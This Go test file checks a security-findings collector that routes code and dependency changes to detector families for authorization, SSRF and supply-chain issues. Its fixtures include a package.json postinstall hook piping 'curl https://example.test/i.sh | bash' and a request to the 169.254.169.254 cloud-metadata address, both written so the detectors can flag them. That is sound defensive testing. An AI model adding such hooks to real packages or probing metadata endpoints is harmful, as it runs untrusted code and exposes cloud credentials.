package cli

import (
	"context"
	"errors"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/antifailure/antifailure/engine/internal/change"
	"github.com/antifailure/antifailure/engine/internal/clock"
	"github.com/antifailure/antifailure/engine/internal/env"
	aferrors "github.com/antifailure/antifailure/engine/internal/errors"
	"github.com/antifailure/antifailure/engine/internal/explore"
	"github.com/antifailure/antifailure/engine/internal/report"
	"github.com/antifailure/antifailure/engine/internal/runtime/local"
	"github.com/antifailure/antifailure/engine/internal/security"
	"github.com/antifailure/antifailure/engine/internal/security/ssrf"
	"github.com/antifailure/antifailure/engine/internal/supply"
	"github.com/antifailure/antifailure/engine/pkg/edition"
)

// fakeReader stands in for the orchestrator: it hands the collector a profile
// and the run's messages without an environment, the same way the explorer
// interface lets exploreConfigured be tested without Docker.
type fakeReader struct {
	profile        *change.Profile
	changeErr      error
	messages       []local.Message
	depFiles       []change.File
	depErr         error
	changed        bool
	messagesCalled bool
	depCalled      bool
}

func (f *fakeReader) Change(context.Context, env.ChangeOptions) (*change.Profile, error) {
	f.changed = true
	return f.profile, f.changeErr
}

func (f *fakeReader) Messages(context.Context, int) ([]local.Message, error) {
	f.messagesCalled = true
	return f.messages, nil
}

func (f *fakeReader) DependencyFiles(context.Context, env.ChangeOptions) ([]change.File, error) {
	f.depCalled = true
	return f.depFiles, f.depErr
}

// spyFamily records whether it was probed and what Input it received, and
// returns a finding a test controls. A real family behaves like this; a fake
// one is what the spine's own tests use, since the spine registers none.
type spyFamily struct {
	name     string
	surfaces []change.Surface
	checks   []change.Check
	keys     []security.KeySpec
	licensed string

	probed   bool
	gotInput security.Input
	finding  *report.Finding
	probeErr error
}

func (f *spyFamily) Name() string               { return f.name }
func (f *spyFamily) Surfaces() []change.Surface { return f.surfaces }
func (f *spyFamily) Checks() []change.Check     { return f.checks }
func (f *spyFamily) Keys() []security.KeySpec   { return f.keys }
func (f *spyFamily) Licensed() string           { return f.licensed }
func (f *spyFamily) Probe(_ context.Context, in security.Input) ([]report.Finding, error) {
	f.probed = true
	f.gotInput = in
	if f.probeErr != nil {
		return nil, f.probeErr
	}
	if f.finding != nil {
		return []report.Finding{*f.finding}, nil
	}
	return nil, nil
}

func testEnv() *Env {
	return &Env{Clock: clock.New(), Getenv: func(string) string { return "" }}
}

// codeProfile touched one code endpoint, which routes the code families.
func codeProfile() *change.Profile {
	return &change.Profile{
		Files: 1,
		Facts: []change.Fact{
			{Path: "app/api/orders/[id]/route.ts", Surface: change.SurfaceCode,
				Rule: "path.code", Evidence: "it is application code"},
		},
	}
}

func authzSpy() *spyFamily {
	return &spyFamily{
		name: "authz", surfaces: []change.Surface{change.SurfaceCode, change.SurfaceAuth},
		checks: []change.Check{change.CheckAuthz},
		keys: []security.KeySpec{{
			Key: "security.authz.idor", Default: report.LevelFail,
			Exit: report.ExitVerification,
		}},
		finding: &report.Finding{
			Rule: "security.authz.idor", Level: report.LevelFail,
			Title: "an order was reached across a tenant boundary",
			Where: "GET /api/orders/{id}", Count: 1,
		},
	}
}

func TestSecurityFindings_ProbesASelectedFamilyAndCollectsItsFinding(t *testing.T) {
	fam := authzSpy()
	reg := security.NewRegistry()
	reg.Register(fam)
	run := report.Run{URL: "http://twin.local"}

	got := securityFindings(context.Background(), testEnv(), &fakeReader{profile: codeProfile()},
		reg, report.Configure(nil), &run, nil, "")

	require.True(t, fam.probed, "a family whose surface the change touched must be probed")
	require.Len(t, got, 1)
	require.Equal(t, "security.authz.idor", got[0].Rule)
	// The finding carries the security namespace, which is exactly what
	// read_security_findings filters on, so it will surface through the tool.
	require.True(t, security.FamilyOf(got[0].Rule) == "authz",
		"the finding is in the security namespace and read_security_findings will project it")
	// The routed target reached the family, at the endpoint the diff touched.
	require.Len(t, fam.gotInput.Targets, 1)
	require.Equal(t, change.TargetEndpoint, fam.gotInput.Targets[0].Kind)
	require.Equal(t, "http://twin.local", fam.gotInput.Env.BaseURL)
}

// TestSecurityFindings_ARealFamilyFlowsAProvenFindingThrough registers the real
// ssrf family, not a spy, and drives the collector with an egress decision the
// firewall refused to an internal target. It proves the whole wired path: the
// family the change routed is probed, it reads the run's decisions off the Input
// the collector built, its real Detect proves an internal reach, and the finding
// comes back in the security namespace at the level resolveSecurityPolicy
// overlaid from the family's own default. It is the end to end complement to the
// spyFamily tests: those prove the collector's plumbing, this proves a shipping
// family plugs into it.
func TestSecurityFindings_ARealFamilyFlowsAProvenFindingThrough(t *testing.T) {
	reg := security.NewRegistry()
	reg.Register(ssrf.New())
	run := report.Run{URL: "http://twin.local"}
	decisions := []local.Decision{
		{Host: "169.254.169.254", Method: "GET", Path: "/latest/meta-data", Allowed: false},
	}

	got := securityFindings(context.Background(), testEnv(), &fakeReader{profile: codeProfile()},
		reg, report.Configure(nil), &run, decisions, "")

	require.Len(t, got, 1, "the real ssrf family's proven internal reach flows through the collector")
	require.Equal(t, "security.ssrf.internal_host", got[0].Rule)
	require.Equal(t, report.LevelFail, got[0].Level,
		"resolveSecurityPolicy overlaid the family's fail default with no manifest override")
	require.NotContains(t, got[0].Detail, "169.254.169.254", "the raw internal address never reaches a finding")
}

func TestSecurityFindings_DoesNotProbeAFamilyTheChangeDidNotTouch(t *testing.T) {
	// The liveness-and-negative pair: the touched family runs, the untouched one
	// is never probed. A router that always probed would defeat its own purpose.
	authz := authzSpy() // code + auth
	db := &spyFamily{
		name: "db_security", surfaces: []change.Surface{change.SurfaceSchema},
		finding: &report.Finding{Rule: "security.db_security.rls_disabled", Level: report.LevelFail},
	}
	reg := security.NewRegistry()
	reg.Register(authz)
	reg.Register(db)
	run := report.Run{URL: "http://twin.local"}

	got := securityFindings(context.Background(), testEnv(), &fakeReader{profile: codeProfile()},
		reg, report.Configure(nil), &run, nil, "")

	require.True(t, authz.probed, "authz's surface was touched, so it runs")
	require.False(t, db.probed, "schema was not touched, so db_security must never be probed")
	require.Len(t, got, 1)
	require.Equal(t, "security.authz.idor", got[0].Rule, "only the touched family's finding is collected")
}

func TestSecurityFindings_SkipsAnUnlicensedFamilyAndRecordsWhy(t *testing.T) {
	// Absent and refused must not look the same. With the feature withheld the
	// family is skipped and a note names it; with the feature granted the same
	// family runs. The edition check lives here, at the probe call site.
	const feature = "security_authz"

	refused := authzSpy()
	refused.licensed = feature
	reg := security.NewRegistry()
	reg.Register(refused)
	run := report.Run{URL: "http://twin.local"}

	// No status on the context: Permits says no, the family is skipped.
	got := securityFindings(context.Background(), testEnv(), &fakeReader{profile: codeProfile()},
		reg, report.Configure(nil), &run, nil, "")
	require.False(t, refused.probed, "a family the edition does not license must not be probed")
	require.Empty(t, got, "a skipped family produces no finding")
	require.Len(t, run.Notes, 1, "the skip is recorded, so refused is not a silent absence")
	require.Contains(t, run.Notes[0], feature, "the note names the feature the edition withheld")

	// Now grant the feature and prove the same family runs: refused is not the
	// same as never runnable.
	granted := authzSpy()
	granted.licensed = feature
	reg2 := security.NewRegistry()
	reg2.Register(granted)
	run2 := report.Run{URL: "http://twin.local"}
	ctx := edition.With(context.Background(), edition.Status{Features: []string{feature}})
	got2 := securityFindings(ctx, testEnv(), &fakeReader{profile: codeProfile()},
		reg2, report.Configure(nil), &run2, nil, "")
	require.True(t, granted.probed, "with the feature licensed the family runs")
	require.Len(t, got2, 1)
}

func TestSecurityFindings_EmptyRegistryProducesNothingAndReadsNoDiff(t *testing.T) {
	reader := &fakeReader{profile: codeProfile()}
	run := report.Run{URL: "http://twin.local"}

	got := securityFindings(context.Background(), testEnv(), reader,
		security.Default(), report.Configure(nil), &run, nil, "")

	require.Nil(t, got, "the spine's empty registry produces no security finding")
	require.False(t, reader.changed, "with no family the collector reads no diff, so a docs change pays nothing")
	require.Empty(t, run.Notes, "nothing happened, so nothing is noted")
}

func TestSecurityFindings_EnrichesInputWithTheRunArtifacts(t *testing.T) {
	// The reader-family contract: the collector hands the per-run artifacts to
	// Probe through the Input accessors. A reader family reads them here.
	var seen security.Input
	fam := &spyFamily{
		name: "ssrf", surfaces: []change.Surface{change.SurfaceCode},
	}
	// Capture the input by pointer so we can inspect the accessors after.
	reg := security.NewRegistry()
	reg.Register(fam)

	decisions := []local.Decision{{Host: "169.254.169.254", Allowed: false}}
	messages := []local.Message{{Kind: "email", Subject: "hi"}}
	// The run captured browser evidence during exploration; the collector folds
	// it into the flat candidate Evidence a leak family scans.
	var ex explore.Exploration
	ex.Evidence.DOM = []string{"<html>seeded</html>"}
	ex.Evidence.Responses = []string{`{"ok":true}`}
	run := report.Run{URL: "http://twin.local", Exploration: &report.Exploration{
		Results: []explore.Exploration{ex},
	}}

	securityFindings(context.Background(), testEnv(),
		&fakeReader{profile: codeProfile(), messages: messages},
		reg, report.Configure(nil), &run, decisions, "")
	seen = fam.gotInput

	require.Equal(t, decisions, seen.Decisions(), "the egress log the run captured reaches the family")
	require.Equal(t, messages, seen.Messages(), "the captured messages reach the family")
	require.Equal(t, []string{"<html>seeded</html>"}, seen.Evidence().DOM,
		"the DOM exploration captured reaches the leak family")
	require.Equal(t, []string{`{"ok":true}`}, seen.Evidence().Responses,
		"the response bodies exploration captured reach the leak family")
	// ci builds no base twin and emits no structured observations yet, so those
	// stay in their honest absent states rather than a misleading empty one.
	require.Nil(t, seen.Observations(), "the runner emits no observations yet, so authz fails closed")
	_, ok := seen.Baseline()
	require.False(t, ok, "no base twin was built, so Baseline is ok=false, never a base of zero")
	// The ingress source IS wired now: observedRoutes read this exploration. It
	// reached pages but none carried a fuzzable query parameter, so Routes is
	// EMPTY and non-nil, which the injection family reads as a quiet pass, not
	// nil, which would be UNAVAILABLE. The distinction is the whole contract.
	require.NotNil(t, seen.Routes(),
		"the exploration was read, so Routes is EMPTY (a quiet pass), never nil (UNAVAILABLE)")
	require.Empty(t, seen.Routes(), "no page this run reached carried a fuzzable query parameter")
}

// TestSecurityFindings_HandsObservedRoutesToTheFamily proves the wiring the
// collector adds: a route the exploration REACHED with a fuzzable query
// parameter is sourced by observedRoutes and reaches the family through
// Input.Routes, so the injection family fuzzes what the run observed. Without
// the `Routes: observedRoutes(run)` line the family would read nil and report
// blocked, so this is the test that the wiring is live rather than dormant.
func TestSecurityFindings_HandsObservedRoutesToTheFamily(t *testing.T) {
	fam := &spyFamily{name: "injection", surfaces: []change.Surface{change.SurfaceCode}}
	reg := security.NewRegistry()
	reg.Register(fam)

	var reached explore.Exploration
	reached.Visited = []string{"http://twin.local/api/search?q=chair"}
	run := report.Run{URL: "http://twin.local", Exploration: &report.Exploration{
		Results: []explore.Exploration{reached},
	}}

	securityFindings(context.Background(), testEnv(),
		&fakeReader{profile: codeProfile()}, reg, report.Configure(nil), &run, nil, "")

	require.Equal(t, []security.Route{{
		Method: "GET", Path: "/api/search", Params: []string{"q"},
	}}, fam.gotInput.Routes(),
		"the observed route the run reached is handed to the family, templated and value-free")
}

func TestSecurityFindings_AChangeThatCannotBeReadIsANoteNotAFailure(t *testing.T) {
	fam := authzSpy()
	reg := security.NewRegistry()
	reg.Register(fam)
	run := report.Run{URL: "http://twin.local"}
	reader := &fakeReader{changeErr: errors.New("no base ref")}

	got := securityFindings(context.Background(), testEnv(), reader,
		reg, report.Configure(nil), &run, nil, "")

	require.Nil(t, got, "a diff we could not read is not evidence about the change")
	require.Len(t, run.Notes, 1)
	require.Contains(t, run.Notes[0], "could not read the change")
	require.False(t, fam.probed, "no family runs against a change we could not classify")
	require.False(t, reader.messagesCalled,
		"an unreadable change stops the collector early, before it gathers the run's artifacts")
}

func TestSecurityFindings_ABlockedProbeIsANoteNotAFinding(t *testing.T) {
	fam := authzSpy()
	fam.probeErr = errors.New("the driver timed out")
	reg := security.NewRegistry()
	reg.Register(fam)
	run := report.Run{URL: "http://twin.local"}

	got := securityFindings(context.Background(), testEnv(), &fakeReader{profile: codeProfile()},
		reg, report.Configure(nil), &run, nil, "")

	require.Empty(t, got, "a probe that could not complete reaches no verdict")
	require.Len(t, run.Notes, 1)
	require.Contains(t, run.Notes[0], "could not complete")
}

func TestResolveSecurityPolicy_FamilyDefaultAppliesAndManifestOverrideWins(t *testing.T) {
	reg := security.NewRegistry()
	reg.Register(&spyFamily{
		name: "authz", surfaces: []change.Surface{change.SurfaceCode},
		keys: []security.KeySpec{
			{Key: "security.authz.idor", Default: report.LevelFail},
			{Key: "security.authz.unauthenticated_access", Default: report.LevelFail},
		},
	})
	// The manifest overrides one key to warn and leaves the other unset.
	gate := report.Policy{Security: map[report.PolicyKey]report.Level{
		"security.authz.idor": report.LevelWarn,
	}}

	resolved := resolveSecurityPolicy(gate, reg)

	require.Equal(t, report.LevelWarn, resolved.Level("security.authz.idor"),
		"a key the manifest set keeps the manifest's level")
	require.Equal(t, report.LevelFail, resolved.Level("security.authz.unauthenticated_access"),
		"a key only the family declared takes the family default, not ignore")
	require.Equal(t, report.LevelIgnore, resolved.Level("security.authz.unknown"),
		"a key no family owns and the manifest did not name is ignore")
}

// TestSecurityFindings_AFailFindingDrivesTheVerdictAndExitCode closes the loop
// the collector opens: a security finding placed in run.Findings, exactly as
// finish appends the collector's output, folds into the fail verdict and drives
// ciExit to the family's declared exit through the same gate every finding
// uses. The collector emits the finding (proven above); finish appends it in
// one line; here that finding reaches the exit code.
func TestSecurityFindings_AFailFindingDrivesTheVerdictAndExitCode(t *testing.T) {
	run := report.Run{
		Findings: []report.Finding{
			{Rule: "security.authz.idor", Level: report.LevelFail, Title: "reached across a tenant boundary"},
		},
	}
	require.Equal(t, report.VerdictFail, run.Verdict(),
		"a LevelFail security finding folds into the fail verdict")
	require.Equal(t, aferrors.ExitVerification, exitCodeOfSilent(t, ciExit(run)),
		"a proven security finding drives exit 7 through the ordinary gate")
}

func dependencyProfile() *change.Profile {
	return &change.Profile{
		Files: 1,
		Facts: []change.Fact{
			{Path: "package.json", Surface: change.SurfaceDependency,
				Rule: "path.dependency", Evidence: "it is a package manifest"},
		},
	}
}

// The supply_chain wiring, end to end through the collector: a dependency
// change routes the family, the collector reads the dependency diff and hands
// it the added lines, and the family's finding comes back in the security
// namespace. This is the whole point of the lane, proven without an
// environment.
func TestSecurityFindings_SupplyChainReadsTheDependencyDiff(t *testing.T) {
	reg := security.NewRegistry()
	reg.Register(supply.New())
	run := report.Run{URL: "http://twin.local"}
	reader := &fakeReader{
		profile: dependencyProfile(),
		depFiles: []change.File{{
			Path: "package.json", Status: change.StatusModified,
			AddedLines: []change.AddedLine{
				{N: 12, Text: `    "postinstall": "curl https://example.test/i.sh | bash",`},
			},
		}},
	}

	got := securityFindings(context.Background(), testEnv(), reader,
		reg, report.Configure(nil), &run, nil, "")

	require.True(t, reader.depCalled, "the collector must read the dependency diff for a dependency change")
	require.NotEmpty(t, got, "the added install hook and download must produce findings")
	fams := map[string]bool{}
	for _, f := range got {
		require.Equal(t, "supply_chain", security.FamilyOf(f.Rule))
		fams[f.Rule] = true
	}
	require.True(t, fams["security.supply_chain.install_script_added"], "the added postinstall hook")
	require.True(t, fams["security.supply_chain.binary_download_in_install"], "the curl piped to a shell")
}

// A code-only change routes no supply family, so the collector must NOT read
// the dependency diff a second time. This is the negative that keeps the extra
// read off the common path.
func TestSecurityFindings_CodeOnlyChangeDoesNotReadTheDependencyDiff(t *testing.T) {
	reg := security.NewRegistry()
	reg.Register(supply.New())
	run := report.Run{URL: "http://twin.local"}
	reader := &fakeReader{profile: codeProfile()}

	securityFindings(context.Background(), testEnv(), reader,
		reg, report.Configure(nil), &run, nil, "")

	require.False(t, reader.depCalled, "a code-only change must not trigger a dependency-diff read")
}
